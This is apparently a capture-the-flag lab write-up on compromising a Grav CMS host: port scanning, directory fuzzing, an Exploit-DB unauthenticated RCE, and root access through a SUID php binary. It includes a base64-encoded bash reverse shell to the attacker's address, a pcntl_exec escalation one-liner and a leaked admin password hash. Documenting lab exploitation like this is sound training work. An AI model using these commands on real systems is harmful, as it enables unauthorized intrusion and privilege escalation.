`nmap -A -T4 -p- 192.168.225.12`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   49.58 ms 192.168.45.1
2   49.56 ms 192.168.45.254
3   50.21 ms 192.168.251.1
4   50.47 ms 192.168.225.12
```


First thing I notice is the `grav-admin/` directory listing. Which doesn't appear to have much besides a successful installation message.

![](Images/Pasted%20image%2020250509115119.png)

Lets do some further enumeration.

```
ffuf -ic -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.225.12/grav-admin/FUZZ
```

```
images                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 396ms]
home                    [Status: 200, Size: 14014, Words: 2089, Lines: 160, Duration: 479ms]
login                   [Status: 200, Size: 13967, Words: 3067, Lines: 190, Duration: 623ms]
user                    [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 380ms]
assets                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 355ms]
admin                   [Status: 200, Size: 15508, Words: 4330, Lines: 139, Duration: 667ms]
bin                     [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 232ms]
system                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 73ms]
cache                   [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 225ms]
vendor                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 127ms]
backup                  [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 62ms]
logs                    [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 133ms]
forgot_password         [Status: 200, Size: 12383, Words: 2246, Lines: 155, Duration: 1508ms]
tmp                     [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 123ms]
```

After testing some basic default cred options I moved on to searching for exploits. We find an unauthenticated RCE [here](https://www.exploit-db.com/exploits/49973)

Fix our exploit script by adjusting target host and adjust the payload as explained in the POC.

```
echo -ne "bash -i >& /dev/tcp/192.168.45.244/80 0>&1" | base64 -w0 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI0NC84MCAwPiYx

target= "http://192.168.225.12/grav-admin"
```

Executing that with a listener gets us our shell.

![](Images/Pasted%20image%2020250509121635.png)

We don't have any permissions to read the user directory `alex` which I assume holds a local flag for us so we will have to escalate first. I will save the root directory in case we need to come back. In the meantime I am going to run some automated enumeration to see if we can find anything.

```
/html/grav-admin
```

We find a potential escalation path in the form of a scheduled task but that appears to be our initial access after checking the directories.

![](Images/Pasted%20image%2020250509122517.png)

Within the web server directory I found the accounts directory which has the salted admin hash `$2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.` but I don't think that leads us anywhere.

After hitting a road block and resetting the instance to be safe, I found a SUID Binary we did not have before

![](Images/Pasted%20image%2020250509124953.png)

Lets see if GTFO bins has something about this.

```
CMD="/bin/sh"
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```

Which gets us escalation through the SUID.

![](Images/Pasted%20image%2020250509125230.png)








